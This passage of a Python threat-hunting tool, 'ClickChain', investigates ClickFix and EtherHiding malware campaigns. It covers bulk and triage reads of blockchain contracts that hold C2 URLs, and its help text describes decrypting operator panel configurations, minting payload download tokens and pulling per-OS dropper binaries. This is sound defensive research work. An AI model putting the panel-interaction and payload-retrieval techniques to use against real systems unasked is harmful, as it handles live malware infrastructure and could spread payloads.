        pp = download_all_os_payloads(
            panel_url, timeout=args.fetch_timeout, out_dir=out_dir,
            known_token=getattr(args, "payload_token", None),
            known_src=getattr(args, "payload_src", None),
            known_mode=getattr(args, "payload_mode", None) or "cloudflare")
    except Exception as e:
        report.setdefault("errors", []).append(f"batch payload fetch failed: {e}")
        return
    report["panel_payloads"] = pp
    meta = pp.get("meta") or {}
    s = report.setdefault("summary", {})
    s["payload_panel_url"]       = _defang(panel_url)
    s["payload_oses_recovered"]  = meta.get("successful_os") or []
    s["payload_distinct_hashes"] = meta.get("distinct_hashes")
    s["payload_all_same"]        = meta.get("all_same_payload")
    s["payload_sha256_list"]     = meta.get("sha256_list") or []
    s["payload_file_magics"]     = meta.get("file_magics") or []


def run_comprehensive_batch(targets: list[str], args, sinks: dict) -> dict:
    """Run the full --comprehensive pipeline over a target list, concurrently.
    Heavy (per-domain DNS/ports/TLS/WordPress/Cloudflare/backdoor/AES + optional
    payload) and contacts more infra than the light sweep — use on a curated
    shortlist, not the whole 5k. Writes one comprehensive CSV row per target."""
    stats = {"total": len(targets), "ok": 0, "fetch_error": 0, "by_role": {}, "by_actor": {}}
    json_buf = []
    lock = threading.Lock()
    print(f"[*] COMPREHENSIVE batch: {len(targets)} targets, {args.workers} workers "
          f"(heavy per-domain pipeline; payload={'on' if args.payload else 'off'})",
          file=sys.stderr, flush=True)

    def _one(t):
        try:
            return investigate_ioc_comprehensive(t, args)
        except Exception as e:
            return {"schema_version": SCHEMA_VERSION, "tool": TOOL_VERSION, "mode": "comprehensive",
                    "ioc": {"input": t}, "errors": [f"worker crash: {e}"],
                    "summary": {}, "lure_page": {}}

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(_one, t): t for t in targets}
        for i, fut in enumerate(as_completed(futs), 1):
            report = fut.result()
            role = (report.get("input_role") or {}).get("role", "?")
            stats["by_role"][role] = stats["by_role"].get(role, 0) + 1
            if report.get("errors") and not report.get("lure_page") and not report.get("panel_payloads"):
                stats["fetch_error"] += 1
            else:
                stats["ok"] += 1
            for a in (report.get("summary") or {}).get("actors_attributed", []) or []:
                nm = a.get("name") if isinstance(a, dict) else a
                if nm: stats["by_actor"][nm] = stats["by_actor"].get(nm, 0) + 1
            with lock:
                if sinks.get("jsonl") is not None:
                    render_json(report, sinks["jsonl"], jsonl=True); sinks["jsonl"].flush()
                if sinks.get("json") is not None:
                    json_buf.append(report)
                if sinks.get("csv") is not None:
                    sinks["csv"].writerow(comprehensive_to_csv_row(report))
            if i % 10 == 0 or report.get("panel_payloads"):
                print(f"  [{i}/{len(targets)}]  {futs[fut]} -> role={role}",
                      file=sys.stderr, flush=True)
    if sinks.get("json") is not None:
        json.dump(json_buf, sinks["json"], ensure_ascii=False, indent=2)
        sinks["json"].write("\n")
    return stats


# ============================================================================
# Bulk contract investigation  (--investigate-contracts FILE / --from-batch JSON)
# ============================================================================
def read_address_list(path: str) -> list[str]:
    """Read 0x… addresses from a file (one per line; comments/defang/blanks ok)."""
    addrs, seen = [], set()
    with open(path, encoding="utf-8-sig", errors="replace") as fh:
        for line in fh:
            s = line.strip()
            if not s or s.startswith("#"):
                continue
            m = re.search(r'0x[0-9a-fA-F]{40}', s)
            if not m:
                continue
            a = m.group(0).lower()
            if a not in seen:
                seen.add(a); addrs.append(a)
    return addrs


def harvest_contracts_from_batch(path: str) -> list[str]:
    """Pull every distinct contract address out of a prior output file. Accepts
    BOTH a single JSON document (--out-json: array or object) AND JSONL
    (--out-jsonl: one report per line). Handles light-batch reports,
    comprehensive reports, bulk-contract bundles, and single objects."""
    addrs, seen = [], set()

    def _add(a):
        if a and re.fullmatch(r'0x[0-9a-f]{40}', str(a).lower()) and str(a).lower() not in seen:
            seen.add(str(a).lower()); addrs.append(str(a).lower())

    try:
        with open(path, encoding="utf-8-sig", errors="replace") as fh:
            text = fh.read()
    except Exception as e:
        print(f"[!] --from-batch: couldn't read {path}: {e}", file=sys.stderr)
        return []
    reports: list = []
    parsed_whole = False
    if text.lstrip()[:1] in ("[", "{"):
        try:
            data = json.loads(text)
            reports = data if isinstance(data, list) else [data]
            parsed_whole = True
        except Exception:
            parsed_whole = False
    if not parsed_whole:
        # JSONL fallback — one JSON record per line (the --out-jsonl shape)
        n_bad = 0
        for line in text.splitlines():
            s = line.strip()
            if not s:
                continue
            try:
                reports.append(json.loads(s))
            except Exception:
                n_bad += 1
        if not reports:
            print(f"[!] --from-batch: {path} parsed as neither JSON nor JSONL "
                  f"({n_bad} unparseable line(s))", file=sys.stderr)
            return []
        print(f"[*] --from-batch: read {len(reports)} record(s) from JSONL {path}",
              file=sys.stderr)
    # A bulk-contract bundle nests its reports under "contracts"; flatten those.
    flat = []
    for rep in reports:
        if isinstance(rep, dict) and rep.get("mode") == "bulk_contracts" and rep.get("contracts"):
            flat.extend(rep["contracts"])
            for c in rep["contracts"]:
                if isinstance(c, dict) and c.get("address"): _add(c["address"])
        else:
            flat.append(rep)
    reports = flat
    for rep in reports:
        if not isinstance(rep, dict):
            continue
        # contract-investigation reports key the address at top level
        if rep.get("address"): _add(rep["address"])
        for a in (rep.get("summary", {}) or {}).get("contract_addresses", []) or []:
            _add(a)
        for container in (rep, rep.get("lure_page") or {}):
            for g in (container.get("groups") or []):
                for c in g.get("classifications", []):
                    for a in c.get("contract_addresses", []) or []:
                        _add(a)
    return addrs


def run_bulk_contracts(addresses: list[str], args) -> dict:
    """Investigate a list of contracts and bundle the per-contract reports.
    Dedupe is the caller's job (read_address_list / harvest already dedupe)."""
    started = datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")
    print(f"[*] BULK contract investigation: {len(addresses)} distinct address(es) on "
          f"{args.chain}", file=sys.stderr, flush=True)
    reports = []
    for i, a in enumerate(addresses, 1):
        print(f"  [{i}/{len(addresses)}] investigating {a}", file=sys.stderr, flush=True)
        try:
            rep = investigate_contract(
                a, chain=args.chain, max_history=args.max_history,
                max_blocks_to_scan=args.max_block_scan, workers=args.workers,
                rpc_override=args.rpc_url, timeout=args.rpc_timeout,
                skip_etherscan=args.skip_etherscan, progress_fh=sys.stderr)
        except Exception as e:
            rep = {"address": a, "chain": args.chain, "errors": [f"crash: {e}"],
                   "summary": {"address": a, "chain": args.chain}}
        reports.append(rep)
    return {"schema_version": SCHEMA_VERSION, "tool": TOOL_VERSION, "mode": "bulk_contracts",
            "started_at": started, "chain": args.chain, "count": len(reports),
            "contracts": reports}


# Bulk-contract CSV schemas
BULK_CONTRACT_SUMMARY_COLUMNS = [
    "address", "chain", "actor", "current_url", "admin_wallet", "admin_attribution",
    "n_selectors", "n_history", "n_distinct_urls", "n_writer_wallets",
    "history_source", "first_rotation_time", "last_rotation_time", "errors",
]
BULK_CONTRACT_ROTATIONS_COLUMNS = [
    "address", "block_number", "block_time", "tx_hash", "from", "from_attribution",
    "selector", "function", "decoded_param", "decoded_param_defanged",
]


def write_bulk_contract_csvs(bundle: dict, summary_path: str):
    """Write the contract-summary CSV (one row/contract) + a long rotations CSV
    (one row per setURL event across all contracts) at <summary_path> and
    <summary_path>.rotations.csv."""
    with open(summary_path, "w", encoding="utf-8", newline="") as f:
        w = csv.DictWriter(f, fieldnames=BULK_CONTRACT_SUMMARY_COLUMNS); w.writeheader()
        for rep in bundle.get("contracts", []):
            s = rep.get("summary", {}) or {}
            w.writerow({
                "address": s.get("address") or rep.get("address", ""),
                "chain": s.get("chain") or rep.get("chain", ""),
                "actor": s.get("actor", ""),
                "current_url": s.get("current_url_defanged") or s.get("current_url", ""),
                "admin_wallet": s.get("admin_wallet", ""),
                "admin_attribution": s.get("admin_attribution", ""),
                "n_selectors": s.get("n_selectors", ""),
                "n_history": s.get("n_history", ""),
                "n_distinct_urls": s.get("n_distinct_urls", ""),
                "n_writer_wallets": s.get("n_writer_wallets", ""),
                "history_source": s.get("history_source", ""),
                "first_rotation_time": s.get("first_rotation_time", ""),
                "last_rotation_time": s.get("last_rotation_time", ""),
                "errors": "; ".join(rep.get("errors", []) or []),
            })
    rot_path = summary_path + ".rotations.csv"
    with open(rot_path, "w", encoding="utf-8", newline="") as f:
        w = csv.DictWriter(f, fieldnames=BULK_CONTRACT_ROTATIONS_COLUMNS); w.writeheader()
        for rep in bundle.get("contracts", []):
            addr = rep.get("address", "")
            for h in rep.get("history", []) or []:
                w.writerow({
                    "address": addr,
                    "block_number": h.get("block_number", ""),
                    "block_time": h.get("block_time", ""),
                    "tx_hash": h.get("tx_hash", ""),
                    "from": h.get("from", ""),
                    "from_attribution": h.get("from_attribution", ""),
                    "selector": h.get("selector", ""),
                    "function": h.get("function", ""),
                    "decoded_param": h.get("decoded_param", ""),
                    "decoded_param_defanged": h.get("decoded_param_defanged", ""),
                })
    return rot_path


def _render_bulk_contracts_text(bundle: dict):
    p = sys.stdout.write
    p("\n" + "=" * 80 + "\n")
    p(f" BULK CONTRACT INVESTIGATION : {bundle.get('count', 0)} contract(s) "
      f"on {bundle.get('chain','?')}\n")
    p("=" * 80 + "\n")
    for rep in bundle.get("contracts", []):
        s = rep.get("summary", {}) or {}
        p(f"\n  {rep.get('address','?')}\n")
        if s.get("actor"):              p(f"      actor:        {s['actor']}\n")
        if s.get("current_url"):        p(f"      current C2:   {s.get('current_url_defanged') or s['current_url']}\n")
        if s.get("admin_wallet"):
            attr = f" ({s['admin_attribution']})" if s.get("admin_attribution") else ""
            p(f"      admin wallet: {s['admin_wallet']}{attr}\n")
        p(f"      selectors={s.get('n_selectors','?')}  history={s.get('n_history','?')}  "
          f"distinct_urls={s.get('n_distinct_urls','?')}  writers={s.get('n_writer_wallets','?')}\n")
        if s.get("first_rotation_time"):
            p(f"      rotations:    {s.get('first_rotation_time')} -> {s.get('last_rotation_time')}\n")
        if rep.get("errors"):
            p(f"      errors:       {'; '.join(rep['errors'])}\n")
    p("\n")


# ============================================================================
# TRIAGE-CONTRACTS mode (MODE 8) — fast per-contract state read.
# ----------------------------------------------------------------------------
# Purpose: triage N candidate contracts in seconds before deciding which ones
# warrant the full --investigate-contracts history scan. Per contract we issue
# exactly ONE JSON-RPC batch over five read-only calls:
#       eth_getCode    (is it a contract? how big is the bytecode?)
#       admin()        0xf851a440  ->  address  (ErrTraffic v3 operator wallet)
#       owner()        0x8da5cb5b  ->  address  (Solidity Ownable pattern)
#       getURL()       0x38bcdc1c  ->  string   (ErrTraffic v3 current C2)
#       url()          0x5600f04f  ->  string   (Solidity auto-getter)
#
# All 5 calls are READ-ONLY (eth_call), so each contract triage:
#   - costs $0 (no gas)
#   - leaves no on-chain trace
#   - cannot be seen by the operator (read goes to a public RPC provider)
#
# Output: one CSV row per contract + a top-level summary block answering
# "how many DISTINCT admin wallets across all these contracts?" — i.e.,
# does a KaaS deployer's 53 contracts map to 53 customers (high distinct
# count) or to 1-2 operators running many instances (low distinct count)?
# ============================================================================

# Selectors we ALWAYS try, with their decode strategy
TRIAGE_SELECTORS: list[tuple[str, str, str]] = [
    ("0xf851a440", "admin",   "address"),
    ("0x8da5cb5b", "owner",   "address"),
    ("0x38bcdc1c", "getURL",  "string"),
    ("0x5600f04f", "url",     "string"),
]


def triage_contract(addr: str, chain: str = "polygon",
                    rpc_override: str | None = None,
                    timeout: int = DEFAULT_RPC_TIMEOUT) -> dict:
    """Fast per-contract triage. ONE JSON-RPC batch per contract over five
    read-only calls (eth_getCode + admin + owner + getURL + url). Decodes
    each return, looks up KNOWN_ACTORS attribution on the contract address
    AND on the admin/owner return. NO history scan, NO writes — costs $0
    and never reaches attacker infrastructure (RPC is a benign 3rd party)."""
    out = {
        "address": addr.lower() if isinstance(addr, str) else "",
        "chain": chain,
        "rpc_used": None,
        "is_contract": False,
        "code_size_bytes": 0,
        "admin_wallet": None,    "admin_attribution": None,
        "owner_wallet": None,    "owner_attribution": None,
        "current_url": None,     "current_url_defanged": None,
        "current_url_host": None, "url_source": None,
        # Raw decoded values per selector — populated regardless of URL shape.
        # Useful when contracts store opaque state (hex/hash) under getURL()/url()
        # instead of an actual URL string (different ABI layout).
        "getURL_raw": None,      "url_raw": None,
        "actor_match": None,
        "selectors_responding": [],
        "errors": [],
    }
    if not re.fullmatch(r'0x[0-9a-f]{40}', out["address"]):
        out["errors"].append("invalid address (must be 0x + 40 hex)")
        return out
    out["actor_match"] = (lookup_actor(out["address"]) or {}).get("name")
    rpcs = [rpc_override] if rpc_override else DEFAULT_RPC_POOL.get(chain, [])
    if not rpcs:
        out["errors"].append(f"no RPC pool known for chain={chain!r}")
        return out

    # One batched request: getCode + 4 eth_calls
    batch = [{"jsonrpc": "2.0", "id": "code", "method": "eth_getCode",
              "params": [out["address"], "latest"]}]
    for sel, _, _ in TRIAGE_SELECTORS:
        batch.append({"jsonrpc": "2.0", "id": sel, "method": "eth_call",
                      "params": [{"to": out["address"], "data": sel}, "latest"]})
    # Race the RPC pool until one returns a usable batch result
    result_map: dict | None = None
    for rpc in rpcs:
        res = _rpc_batch(rpc, batch, timeout)
        if res is not None:
            result_map = {batch[i]["id"]: res[i] for i in range(len(batch))}
            out["rpc_used"] = rpc
            break
    if result_map is None:
        out["errors"].append(f"all {len(rpcs)} RPCs failed")
        return out

    # eth_getCode -> bytecode size + is_contract
    code = result_map.get("code")
    if isinstance(code, str) and code.startswith("0x"):
        out["code_size_bytes"] = max(0, (len(code) - 2) // 2)
    out["is_contract"] = out["code_size_bytes"] > 0

    # address-returning getters (admin / owner)
    for sel, name, kind in TRIAGE_SELECTORS:
        if kind != "address": continue
        raw = result_map.get(sel)
        if not isinstance(raw, str) or raw in ("", "0x"): continue
        decoded = _decode_abi_address(raw)
        if decoded:
            out[f"{name}_wallet"] = decoded
            out[f"{name}_attribution"] = (lookup_actor(decoded) or {}).get("name")
            out["selectors_responding"].append(sel)

    # string-returning getters (getURL / url) — first URL-shaped value wins for current_url
    for sel, name, kind in TRIAGE_SELECTORS:
        if kind != "string": continue
        raw = result_map.get(sel)
        if not isinstance(raw, str) or raw in ("", "0x"): continue
        decoded = decode_abi_string(raw, lax_drop_nulls=True)
        if not decoded: continue
        out["selectors_responding"].append(sel)
        # ALWAYS record the raw decoded value (useful when the contract stores
        # opaque hex/hash state under a getURL()-shaped selector).
        out[f"{name}_raw"] = decoded
        if out["current_url"]: continue  # already have a URL — don't overwrite
        # Heuristic: real ClickFix C2s look like "host[.tld]" or "https://host…/path".
        # Reject all-hex blobs (common when getURL() is reused for raw bytes32
        # storage on a fork) by requiring at least one '.' or '/' AND ≥1 ASCII
        # letter, AND no large runs of non-printable/non-URL characters.
        if _looks_like_url_or_host(decoded):
            out["current_url"] = decoded
            out["current_url_defanged"] = _defang(decoded)
            out["url_source"] = name
            try:
                u = decoded if "://" in decoded else "https://" + decoded
                out["current_url_host"] = urllib.parse.urlparse(u).hostname
            except Exception:
                pass
    return out


# URL / host plausibility filter for triage decoding. Doesn't validate scheme
# or DNS; just rejects obvious non-URL string returns (hex blobs, all-digit IDs,
# raw bytes-as-ASCII). Conservative — false negatives are fine; false positives
# would mislabel "raw contract state" as a C2 URL.
_URL_HEX_ONLY_RE = re.compile(r'^[0-9a-fA-F]+$')

def _looks_like_url_or_host(s: str) -> bool:
    if not s or len(s) < 4 or len(s) > 2048: return False
    if _URL_HEX_ONLY_RE.fullmatch(s) and len(s) >= 16:
        return False  # all-hex string of nontrivial length → bytes32/hash, not a URL
    if "." not in s and "/" not in s and "://" not in s:
        return False  # need at least one URL-shape marker
    # Reject if dominated by non-URL chars (control bytes, high-ASCII garbage)
    bad = sum(1 for c in s if (ord(c) < 32) or (ord(c) > 126))
    if bad and bad / len(s) > 0.1: return False
    # Need at least one ASCII letter to look like a host
    if not any('a' <= c.lower() <= 'z' for c in s): return False
    return True


def run_triage_contracts(addresses: list[str], args) -> dict:
    """Triage N contracts in parallel via ThreadPoolExecutor. Each contract
    is one JSON-RPC batched round-trip (~100 ms on healthy public RPC), so
    81 contracts × `--workers` = sub-10-seconds total."""
    started = datetime.datetime.now(datetime.timezone.utc).isoformat(
        timespec="seconds").replace("+00:00", "Z")
    print(f"[*] TRIAGE: {len(addresses)} contract(s) on {args.chain} | "
          f"parallel {args.workers} workers | read-only "
          f"(getCode+admin+owner+getURL+url)", file=sys.stderr, flush=True)
    reports: list[dict] = []
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        fut_map = {ex.submit(triage_contract, a, args.chain,
                             args.rpc_url, args.rpc_timeout): a for a in addresses}
        done = 0
        for fut in as_completed(fut_map):
            done += 1
            try: rep = fut.result()
            except Exception as e:
                rep = {"address": fut_map[fut], "chain": args.chain,
                       "errors": [f"crash: {e}"]}
            reports.append(rep)
            if done % 20 == 0 or done == len(addresses):
                print(f"  [triage] {done}/{len(addresses)} done",
                      file=sys.stderr, flush=True)

    reports.sort(key=lambda r: r.get("address", ""))

    # Aggregate: how many distinct admin wallets across this set?
    admins = [r.get("admin_wallet") for r in reports if r.get("admin_wallet")]
    owners = [r.get("owner_wallet") for r in reports if r.get("owner_wallet")]
    urls   = [r.get("current_url")  for r in reports if r.get("current_url")]
    n_contracts = sum(1 for r in reports if r.get("is_contract"))
    n_eoa       = sum(1 for r in reports if not r.get("is_contract") and not r.get("errors"))
    n_failed    = sum(1 for r in reports if r.get("errors"))

    # admin wallet -> [contract addrs that report this admin]
    admin_to_contracts: dict[str, list[str]] = {}
    for r in reports:
        a = r.get("admin_wallet")
        if a:
            admin_to_contracts.setdefault(a, []).append(r["address"])

    return {
        "schema_version": SCHEMA_VERSION,
        "tool": TOOL_VERSION,
        "mode": "triage_contracts",
        "started_at": started,
        "chain": args.chain,
        "count": len(reports),
        "summary": {
            "n_contracts": n_contracts,
            "n_eoa_or_unbacked": n_eoa,
            "n_failed": n_failed,
            "admin_wallets_distinct": len(set(admins)),
            "owner_wallets_distinct": len(set(owners)),
            "live_urls_observed": len(set(urls)),
            "admin_wallet_counts": {w: len(cs) for w, cs in
                                    sorted(admin_to_contracts.items(),
                                           key=lambda kv: -len(kv[1]))},
            "admin_wallets": sorted(set(admins)),
            "live_urls": sorted(set(urls)),
        },
        "contracts": reports,
    }


TRIAGE_CSV_COLUMNS = [
    "address", "chain",
    "is_contract", "code_size_bytes",
    "admin_wallet", "admin_attribution",
    "owner_wallet", "owner_attribution",
    "current_url", "current_url_defanged", "current_url_host", "url_source",
    # raw-state preview for selectors that returned non-URL data
    "getURL_raw_head", "url_raw_head",
    "actor_match",
    "selectors_responding",
    "rpc_used", "errors",
]


def write_triage_csv(bundle: dict, csv_path: str):
    """One row per contract. Spreadsheet-ready. Pair with the JSON output for
    the full picture; the JSON's `summary.admin_wallet_counts` answers the
    'how many distinct customers' question without opening Excel."""
    with open(csv_path, "w", encoding="utf-8", newline="") as f:
        w = csv.DictWriter(f, fieldnames=TRIAGE_CSV_COLUMNS); w.writeheader()
        for rep in bundle.get("contracts", []):
            w.writerow({
                "address":              rep.get("address", ""),
                "chain":                rep.get("chain", ""),
                "is_contract":          rep.get("is_contract", ""),
                "code_size_bytes":      rep.get("code_size_bytes", ""),
                "admin_wallet":         rep.get("admin_wallet") or "",
                "admin_attribution":    rep.get("admin_attribution") or "",
                "owner_wallet":         rep.get("owner_wallet") or "",
                "owner_attribution":    rep.get("owner_attribution") or "",
                "current_url":          rep.get("current_url") or "",
                "current_url_defanged": rep.get("current_url_defanged") or "",
                "current_url_host":     rep.get("current_url_host") or "",
                "url_source":           rep.get("url_source") or "",
                "getURL_raw_head":      (rep.get("getURL_raw") or "")[:96],
                "url_raw_head":         (rep.get("url_raw") or "")[:96],
                "actor_match":          rep.get("actor_match") or "",
                "selectors_responding": "; ".join(rep.get("selectors_responding") or []),
                "rpc_used":             rep.get("rpc_used") or "",
                "errors":               "; ".join(rep.get("errors") or []),
            })


def _render_triage_text(bundle: dict):
    """Terminal-friendly triage report. Headline: distinct admin-wallet count."""
    p = sys.stdout.write
    s = bundle.get("summary", {}) or {}
    total = bundle.get("count", 0)
    p("\n" + "=" * 80 + "\n")
    p(f" CONTRACT TRIAGE  :  {total} address(es) on {bundle.get('chain','?')}\n")
    p("=" * 80 + "\n")
    p(f"  is-contract (has bytecode) : {s.get('n_contracts', 0)} / {total}\n")
    p(f"  EOA / no bytecode          : {s.get('n_eoa_or_unbacked', 0)}\n")
    p(f"  RPC-failed                 : {s.get('n_failed', 0)}\n")
    p(f"  DISTINCT admin() wallets   : {s.get('admin_wallets_distinct', 0)}\n")
    p(f"  DISTINCT owner() wallets   : {s.get('owner_wallets_distinct', 0)}\n")
    p(f"  DISTINCT live C2 URLs      : {s.get('live_urls_observed', 0)}\n")

    counts = s.get("admin_wallet_counts") or {}
    if counts:
        p("\n  admin() wallet -> #contracts:\n")
        for w, n in counts.items():
            attr = None
            for c in bundle.get("contracts", []):
                if c.get("admin_wallet") == w and c.get("admin_attribution"):
                    attr = c["admin_attribution"]; break
            attr_str = f"   ← {attr}" if attr else ""
            p(f"    {w}   {n} contract{'s' if n>1 else ''}{attr_str}\n")

    urls = s.get("live_urls") or []
    if urls:
        p(f"\n  live URLs ({len(urls)}, showing first 20):\n")
        for u in urls[:20]:
            p(f"    {_defang(u)}\n")

    p("\n  PER-CONTRACT:\n")
    for rep in bundle.get("contracts", []):
        addr = rep.get("address", "?")
        if rep.get("errors"):
            p(f"    {addr}   ERROR: {'; '.join(rep['errors'])}\n"); continue
        bits = []
        if rep.get("admin_wallet"):
            bits.append(f"admin={rep['admin_wallet']}")
        if rep.get("owner_wallet") and rep["owner_wallet"] != rep.get("admin_wallet"):
            bits.append(f"owner={rep['owner_wallet']}")
        if rep.get("current_url"):
            url_disp = rep.get("current_url_defanged") or rep["current_url"]
            src = f" (via {rep['url_source']}())" if rep.get("url_source") else ""
            bits.append(f"url={url_disp}{src}")
        else:
            # Surface non-URL raw state if getURL()/url() responded but the
            # value didn't look like a URL (e.g. raw bytes32 stored under the
            # same selector — alternate ABI). Show first ~32 chars only.
            raw = rep.get("getURL_raw") or rep.get("url_raw")
            if raw:
                preview = raw[:32] + ("…" if len(raw) > 32 else "")
                src = "getURL" if rep.get("getURL_raw") else "url"
                bits.append(f"raw_state={preview} (via {src}(), not URL-shaped)")
        if not rep.get("is_contract"):
            bits.append("(NOT a contract — EOA or unfunded)")
        elif not bits:
            bits.append(f"(contract, {rep.get('code_size_bytes','?')}B code, "
                        f"no admin/owner/url selectors responded)")
        if rep.get("actor_match"):
            bits.append(f"actor={rep['actor_match']}")
        p(f"    {addr}   {'  |  '.join(bits)}\n")
    p("\n")


# ============================================================================
# CLI
# ============================================================================
def main():
    ap = argparse.ArgumentParser(
        prog="clickchain.py",
        description=("ClickChain — the ClickFix / ErrTraffic / ClearFake EtherHiding hunter. "
                     "Decode, classify, attribute, resolve, fingerprint, recover, and investigate, "
                     "from a single URL up to batch scale on 1000s of IOCs."),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=r"""
═══════════════════════════════════════════════════════════════════════════════
 MODES
═══════════════════════════════════════════════════════════════════════════════

 1. SINGLE STATIC DECODE       clickchain.py <ClickGrab-json | .html | -stdin>
        Decode obfuscated loader, classify, attribute against KNOWN_ACTORS,
        write recovered .js files. No network unless --resolve.

 2. SINGLE PASSIVE FETCH       clickchain.py <url-or-domain>
        Passive GET (browser UA, no JS), then everything from mode 1.

 3. LIGHT BATCH (default)      clickchain.py <target-list.txt> --workers N [--resolve]
        Newline-separated URLs/domains (defanged ok). ThreadPoolExecutor
        concurrency. Decode + classify + attribute (+ on-chain resolve with
        --resolve). Stream to text/JSON/JSONL/CSV simultaneously. ~200ms/domain.
        Add --payload to also pull per-OS payload METADATA from each resolved
        panel (hash/magic/size/headers, bytes discarded; cached per-panel — see
        --payload-files to keep bytes). Requires --resolve to locate panels.

 4. COMPREHENSIVE (single IOC) clickchain.py <url-or-domain> --comprehensive [--payload]
        Full pipeline for one IOC. Auto-detects input role (LURE vs PANEL) and
        routes accordingly:
          LURE-mode  (default):   fetch lure HTML, decode obfuscated loader (incl.
                                  BW v2 IIFE-wrapped XOR layout), classify,
                                  on-chain resolve EtherHiding contract (handles
                                  both v3-original getURL() and BW v2 / Aeternum
                                  getDomain() selectors), fingerprint lure + panel
                                  hosts (DNS/ports/TLS), detect WordPress (10-signal
                                  scoring), detect Cloudflare (lure + panel separately),
                                  probe /wp-content/mu-plugins/session-manager.php
                                  for the ErrTraffic backdoor (LevelBlue 2026),
                                  AES-decrypt the clipboard PS, parse stager URL,
                                  optionally download per-OS payloads.
          PANEL-mode (auto):      skip lure decode; AES-256-GCM-decrypt the panel's
                                  /api/cfg + /api/settings envelopes (yielding the
                                  operator's live mode / enabled / blockBots /
                                  rentalExpired config), then go straight to
                                  /api/index.php?a=init for each OS, AES-decrypt
                                  the served clipboard PS (v3-original) OR consume
                                  the plain hex token (v3 BW v2), download the
                                  per-OS binary.

        Add --payload to fetch binaries. Five download strategies tried in order:
          0) known-token /a=dl       (--payload-token from FLARE-VM walk-through OR
                                      token parsed from in-run AES recovery)
          1) v3 admin mint           (Censys /index.php?action=generateDownloadToken)
          2) v2 admin mint           (/api/generate-download-token.php)
          3) v3 ORIGINAL runtime     (init → {ok:true,token:<AES PS>} → AES-CBC
                                      decrypt → extract real dl token → /a=dl)
          4) v3 BW V2 runtime        (init → {token:<sha256-hex>} → /a=dl?uj=<hex>
                                      &rlm=<src-tag>; the modern May-2026 path)

        PAYLOAD CAPTURE (default = metadata-only): ClickChain hashes each payload
        (sha256/sha1/md5), records file-magic + size + FULL HTTP response headers
        (Server / ETag / Last-Modified / Content-Disposition filename), then
        DISCARDS the bytes — so you can analyze uniqueness + infra rotation with
        near-zero storage and nothing malicious on disk. Add --payload-files to
        also persist 3 artifacts side-by-side per OS:
          <host>.<os>.<sha12>.bin             — recovered binary (.bin, never .exe)
          <host>.<os>.<sha12>.clipboard.ps1   — raw AES PS the panel served
          <host>.<os>.<sha12>.decoded.ps1     — AES-decrypted dropper plaintext

 5. CONTRACT INVESTIGATE       clickchain.py --investigate-contract 0xADDR [--chain]
        eth_getCode + PUSH4 dispatch-scan + call every known getter (decodes the
        C2 URL string AND the admin()/owner() operator wallet, cross-referenced
        against KNOWN_ACTORS) + tx history via Etherscan (POLYGONSCAN_API_KEY env)
        -> eth_getLogs -> parallel batched block-scan. Reconstructs the full
        setURL rotation timeline + writer wallets.

 6. COMPREHENSIVE BATCH        clickchain.py <target-list.txt> --comprehensive [--payload]
        Runs the full mode-4 pipeline over EVERY line in a list (heavy: per-domain
        DNS/ports/TLS + WordPress + Cloudflare + backdoor probe + AES + optional
        payload). Use on a curated shortlist, not the whole 5k. One comprehensive
        CSV row per target + .loaders/.scripts sidecars.

 7. BULK CONTRACTS             clickchain.py --investigate-contracts addrs.txt
                               clickchain.py --from-batch sweep.json   [--chain]
        Investigate many contracts at once. Feed an address file AND/OR auto-harvest
        every distinct contract address out of a prior --out-json sweep. Writes a
        per-contract JSON array + a contract-summary CSV (one row/contract: current
        C2, admin wallet, #rotations, actor) + a long rotations CSV (one row per
        setURL event across ALL contracts) at <out-csv> and <out-csv>.rotations.csv.

 8. TRIAGE CONTRACTS           clickchain.py --triage-contracts addrs.txt   [--chain]
                               clickchain.py --triage-contracts addrs.txt --from-batch sweep.json
        FAST per-contract state read for many addresses. Each address gets ONE
        JSON-RPC batched round-trip (eth_getCode + admin() + owner() + getURL()
        + url()), parallelized via --workers. NO history scan, NO writes —
        $0 cost per contract, never contacts attacker infrastructure (RPC is a
        benign 3rd party). Output: one CSV row per contract + a JSON summary
        block answering "how many DISTINCT admin wallets across this set?" —
        i.e., 53 contracts -> 53 customers (KaaS) vs -> 1-2 operators (vertical
        ops). Use BEFORE --investigate-contracts to triage which contracts
        actually warrant the full setURL history scan.
        Can also be combined with --from-batch (auto-harvest contracts from a
        prior sweep output). Roughly 100 ms / contract on a healthy public RPC.

═══════════════════════════════════════════════════════════════════════════════
 INPUTS  (auto-detected; defang/scheme handled automatically)
═══════════════════════════════════════════════════════════════════════════════
   https://victim.com/            URL
   victim.com   victim[.]com      bare domain (defanged ok)
   hosts.txt                      newline-separated targets (defanged ok)
   report.json                    ClickGrab JSON with RawHTML field
   page.html  page.htm            saved HTML file
   ./dir/                         recurse over *.json / *.html / *.htm
   -                              stdin

═══════════════════════════════════════════════════════════════════════════════
 OUTPUT
═══════════════════════════════════════════════════════════════════════════════
   stdout text       human-readable, colored on TTY, --quiet to silence per-block
   --format json     single JSON doc (single input) or array (multi-input)
   --format jsonl    one JSON record per line — preferred at batch scale
   --out-json FILE   simultaneous JSON file (in addition to stdout)
   --out-jsonl FILE  simultaneous JSONL file
   --out-csv FILE    simultaneous flat CSV. Light batch carries payload metadata
                     columns (hashes/magics/filenames/servers) when --payload is on.
                     Comprehensive writes a richer CSV + `.loaders.csv`/`.scripts.csv`
                     sidecars. Bulk contracts writes a summary CSV + `.rotations.csv`.
   NOTE              payload hashes + file-magic + size + full HTTP headers ALWAYS
                     travel in the JSON/CSV even in metadata-only mode — the bytes
                     are the only thing withheld (use --payload-files to keep them).
   --out DIR         dir for recovered .js files  (pass '' to skip)
   --dump DIR        DEBUG mode: dump every raw artifact (lure HTML, role probe,
                     decoded JS, per-OS AES PS, per-OS decrypted PS, per-OS binary,
                     full strategy diagnostics) for offline analysis

═══════════════════════════════════════════════════════════════════════════════
 OPSEC NOTES
═══════════════════════════════════════════════════════════════════════════════
   Static decode      pure-Python sandboxed AST eval, NEVER runs attacker JS
   URL fetch          plain urllib GET, no JS, no form submission. Your IP IS
                      visible to the target's logs; use sandbox / non-attributable network
   --resolve          read-only eth_call to PUBLIC RPC providers (no attacker contact)
   --triage-contracts read-only batched eth_call only; same OPSEC profile as --resolve.
                      No contract write, no gas spent, operator cannot observe the read.
